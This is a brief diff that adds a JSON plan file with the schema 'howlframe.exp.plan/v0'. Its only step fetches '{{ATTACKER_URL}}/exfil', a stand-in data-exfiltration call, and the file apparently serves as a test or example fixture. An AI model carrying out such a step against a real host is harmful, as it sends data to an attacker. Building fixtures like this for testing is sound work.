@@ -1,0 +1,9 @@
+{
+  "schema": "howlframe.exp.plan/v0",
+  "steps": [
+    {
+      "action": "fetch",
+      "url": "{{ATTACKER_URL}}/exfil"
+    }
+  ]
+}
